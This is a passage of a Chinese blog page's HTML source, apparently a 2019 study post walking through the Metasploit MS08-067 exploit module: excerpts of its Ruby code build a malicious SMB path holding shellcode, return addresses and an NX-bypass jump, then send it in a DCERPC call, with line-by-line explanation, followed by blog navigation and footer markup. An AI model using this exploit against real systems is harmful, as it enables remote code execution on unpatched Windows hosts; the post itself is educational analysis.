class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">  def exploit</span><br><span class="line">    begin</span><br><span class="line">      connect</span><br><span class="line">      smb_login</span><br><span class="line">    rescue Rex::Proto::SMB::Exceptions::LoginError =&gt; e</span><br><span class="line">      <span class="keyword">if</span> e.message =~ /Connection reset/</span><br><span class="line">        print_error(<span class="string">'Connection reset during login'</span>)</span><br><span class="line">        print_error(<span class="string">'This most likely means a previous exploit attempt caused the service to crash'</span>)</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        raise e</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use a copy of the target</span></span><br><span class="line">    mytarget = target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target[<span class="string">'auto'</span>]</span><br><span class="line"></span><br><span class="line">      mytarget = nil</span><br><span class="line"></span><br><span class="line">      print_status(<span class="string">'Automatically detecting the target...'</span>)</span><br><span class="line">      fprint = smb_fingerprint</span><br><span class="line"></span><br><span class="line">......more......</span><br><span class="line"><span class="comment"># Build the malicious path name</span></span><br><span class="line"></span><br><span class="line">    padder = [*(<span class="string">'A'</span>..<span class="string">'Z'</span>)]</span><br><span class="line">    pad = <span class="string">'A'</span></span><br><span class="line">    <span class="keyword">while</span> pad.length &lt; 7</span><br><span class="line">      c = padder[rand(padder.length)]</span><br><span class="line">      next <span class="keyword">if</span> pad.index(c)</span><br><span class="line">      pad += c</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    prefix = <span class="string">'\\'</span></span><br><span class="line">    path   = <span class="string">''</span></span><br><span class="line">    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase</span><br><span class="line"></span><br><span class="line">......more......</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Windows 2000, XP (NX), and 2003 (NO NX) targets</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">      jumper = Rex::Text.rand_text_alpha(70).upcase</span><br><span class="line">      jumper[ 4, 4] = [mytarget.ret].pack(<span class="string">'V'</span>)</span><br><span class="line">      jumper[50, 8] = make_nops(8)</span><br><span class="line">      jumper[58, 2] = <span class="string">"\xeb\x62"</span></span><br><span class="line"></span><br><span class="line">      path =</span><br><span class="line">        Rex::Text.to_unicode(<span class="string">'\\'</span>) +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># This buffer is removed from the front</span></span><br><span class="line">        Rex::Text.rand_text_alpha(100) +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Shellcode</span></span><br><span class="line">        payload.encoded +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Relative path to trigger the bug</span></span><br><span class="line">        Rex::Text.to_unicode(<span class="string">'\\..\\..\\'</span>) +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Extra padding</span></span><br><span class="line">        Rex::Text.to_unicode(pad) +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Writable memory location (static)</span></span><br><span class="line">        [mytarget[<span class="string">'Scratch'</span>]].pack(<span class="string">'V'</span>) + <span class="comment"># EBP</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Return to code which disables NX (or just the return)</span></span><br><span class="line">        [mytarget[<span class="string">'DisableNX'</span>] || mytarget.ret].pack(<span class="string">'V'</span>) +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Padding with embedded jump</span></span><br><span class="line">        jumper +</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NULL termination</span></span><br><span class="line">        <span class="string">"\x00"</span> * 2</span><br><span class="line"></span><br><span class="line">    end</span><br></pre></td></tr></table></figure></p>
+<p>　　1. 第1~25行：首先exploit函数先建立TCP连接，然后进行SMB空会话连接，如果指定了目标系统，则赋予其相应的参数值，如果选择自动获取模式，则尝试通过SMB协议会话获取目标系统信息。<br>　　2. 第26~40行：开始构造恶意路径，先初始化了一些变量，包括填补字符变量<code>pad</code>。服务器名称<code>server</code>，前缀<code>prex</code>，路径<code>path</code>。<strong>其中调用的库<code>Rex</code>是Metasploit体系结构的基础，在Ruby的基础上提供支持多种协议的客户端和服务端类、日志记录、编码、输入和输出等有用的类</strong>。<br>　　下面是关于Windows 2003 SP0 Universal的前面初始化的TARGET中的信息：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Standard return-to-ESI without NX bypass</span></span><br><span class="line">[<span class="string">'Windows 2003 SP0 Universal'</span>,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">'Ret'</span>       =&gt; <span class="number">0x0100129e</span>,</span><br><span class="line">             <span class="string">'Scratch'</span>   =&gt; <span class="number">0x00020408</span>,</span><br><span class="line">           &#125;</span><br><span class="line">          ], <span class="comment"># JMP ESI SVCHOST.EXE</span></span><br></pre></td></tr></table></figure></p>
+<p>　　赋值了Ret、Scratch变量，由注释得Ret对应的是SVCHOST.EX系统文件中的JMP ESI指令地址，即这个攻击模块是利用ESI寄存器中指向栈空间的地址，覆盖其返回地址，并通过SVCHOST.EXE中的JMP ESI指令进行中转，最终执行了栈中的Shellcode。<br>　　3. 第41~78行：首先构造内含跳转地址的填充字符串jumper，jumper初始化为长度70字节，’A’到’Z’的随机字符，从第5字节其填充4字节由初始化变数Ret定义的返回地址。从51字节起填充8字节的控制领和2字节的跳转指令<code>\xeb\x62</code>(jump 0x62)。之后第51行生成恶意路径<code>path</code>，由8个部分构成。其中包括编码的shellcode、触发漏洞的unicode相对路径<code>\..\..\</code>，填补字符串pad，EBP栈基址、RET返回地址、跳转指令快jumper、字符串结尾’\0’。。</p>
+<p>　　至此恶意请求的元素就准备好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">　　handle = dcerpc_handle(</span><br><span class="line">    <span class="string">'4b324fc8-1670-01d3-1278-5a47bf6ee188'</span>, <span class="string">'3.0'</span>,</span><br><span class="line">    <span class="string">'ncacn_np'</span>, [<span class="string">"\\#&#123;datastore['SMBPIPE']&#125;"</span>]</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  dcerpc_bind(handle)</span><br><span class="line"></span><br><span class="line">  stub =</span><br><span class="line">    NDR.uwstring(server) +</span><br><span class="line">    NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">    NDR.long(rand(1024)) +</span><br><span class="line">    NDR.wstring(prefix) +</span><br><span class="line">    NDR.long(4097) +</span><br><span class="line">    NDR.long(0)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># <span class="doctag">NOTE:</span> we don't bother waiting for a response here...</span></span><br><span class="line">  print_status(<span class="string">'Attempting to trigger the vulnerability...'</span>)</span><br><span class="line">  dcerpc.call(0x1f, stub, <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Cleanup</span></span><br><span class="line">  handler</span><br><span class="line">  disconnect</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>　　1. 第1~4行首先向远程主机的SMB端口发起RPC请求。<br>　　2. 第8~14行将前面准备好的各元素构成完整的数据包Stub。<br>　　3. 最后将Stub作为内容调用远程及的RPC接口。</p>
+<p>补充： Stub是服务NwtPathCanonicalize结构的标准调用爆头，将处罚远程主机上的Server服务去调用路径规范化处理函数NetpwPathCanonicalize，其srvsvc_NetPathCanonicalize结构体如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct srvsvc_NetPathCanonicalize&#123;</span><br><span class="line">    struct &#123;</span><br><span class="line">        const char *server_unc;/*[unique, charset(UTF16)]*/</span><br><span class="line">        const char *path;/*[charset (UTF16)]*/</span><br><span class="line">        uint32_tmaxbuf;</span><br><span class="line">        const char *prefix;/*[charset (UTF16)]*/</span><br><span class="line">        uint32_t pathflags;</span><br><span class="line">        uint32_t *pathtype;/*[ref]*/</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://lzwgiter.github.io">float</a>
+            <p>原文链接: <a href="http://lzwgiter.github.io/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/">http://lzwgiter.github.io/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/</a>
+            <p>发表日期: <a href="http://lzwgiter.github.io/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/">February 10th 2019, 8:56:55 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/Metasploit渗透测试魔鬼训练营-web应用渗透/" title= Metasploit渗透测试魔鬼训练营-web应用渗透 >
+                    <div class="prevTitle">Metasploit渗透测试魔鬼训练营-web应用渗透</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:float311@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/lzwgiter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS08-067介绍"><span class="toc-number">1.</span> <span class="toc-text">MS08-067介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击过程复现"><span class="toc-number">2.</span> <span class="toc-text">攻击过程复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS08-067漏洞攻击模块源代码分析"><span class="toc-number">3.</span> <span class="toc-text">MS08-067漏洞攻击模块源代码分析</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 40
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/" >Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-web应用渗透/" >Metasploit渗透测试魔鬼训练营-web应用渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-服务扫描与查点/" >Metasploit渗透测试魔鬼训练营-服务扫描与查点</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/04</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-信息收集/" >Metasploit渗透测试魔鬼训练营-信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-环境搭建/" >Metasploit渗透测试魔鬼训练营 第一天</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/Typecho-反序列化漏洞/" >小明的博客--Typecho 反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/Bugku的一道注入---多次/" >Bugku的一道注入---多次</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/Bugku的一道注入---INSERT INTO注入/" >Bugku的一道注入--INSERT INTO注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/ThinkPHP框架学习---路由/" >ThinkPHP框架学习---路由</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---框架目录及框架配置/" >ThinkPHP框架学习---框架目录及框架配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---config类和config助手函数/" >ThinkPHP框架学习---config类和config助手函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/Nmap使用指南/" >Nmap使用指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/Mysql小记---二/" >Mysql小记(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/PHP学习-超级全局变量/" >PHP学习--超级全局变量</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/PHP学习-变量/" >PHP学习--变量</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/PHP框架之MVC模式学习/" >PHP框架MVC学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/CTF中的python脚本题小结（二）/" >CTF中的python脚本题小结（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/CTF中的python脚本题小结（一）/" >CTF中的python脚本题小结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/Hackergame-2018-wp/" >Hackergame 2018 wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/安恒九月题的misc和一道web/" >安恒九月题的misc和一道web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/Mysql小记---一/" >Mysql小记(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/隐写术-LSB隐写/" >隐写术-LSB隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/隐写术-NTFS流隐写/" >隐写术--NTFS流隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/CTF常见隐写手段小结/" >CTF常见隐写手段小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span><a class="archive-post-title" href= "/DOM-文档对象模型基础/" >DOM 文档对象模型</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之history和screen对象/" >BOM-浏览器操作对象模型之history和screen对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之navigator、location对象/" >BOM 浏览器操作对象模型之navigator、location对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之window对象/" >BOM 浏览器操作对象模型之window对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/Javascript基础之数据类型2/" >Javascript基础之数据类型2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/Javascript基础之数据类型1/" >Javascript基础之数据类型1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/CTF ZIP结构/" >CTF隐写术--关于ZIP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/CSS基础4.4--选择器之伪类选择器/" >CSS样式基础4.4--选择器之伪类选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/猫片/" >Bugku的一道misc-----猫片</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/CSS基础4.3--选择器之属性选择器/" >CSS基础4.3--选择器之属性选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/CSS基础4.2--选择器之组合选择器/" >CSS基础4.2--选择器之组合选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/CSS基础4.1--选择器之基本选择器/" >CSS基础4.1--选择器之基本选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/CSS基础3.2--特性之继承性/" >CSS基础3.2--特性之继承性</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础3.1--特性之层叠性/" >CSS基础3.1--特性之层叠性</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础2--应用/" >CSS基础2--应用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础1--样式/" >CSS基础1--样式</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Javascript"><span class="iconfont-archer">&#xe606;</span>Javascript</span>
+    
+        <span class="sidebar-tag-name" data-tags="BOM"><span class="iconfont-archer">&#xe606;</span>BOM</span>
+    
+        <span class="sidebar-tag-name" data-tags="Bugku"><span class="iconfont-archer">&#xe606;</span>Bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写术"><span class="iconfont-archer">&#xe606;</span>隐写术</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="DOM"><span class="iconfont-archer">&#xe606;</span>DOM</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="安恒月赛"><span class="iconfont-archer">&#xe606;</span>安恒月赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "float"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
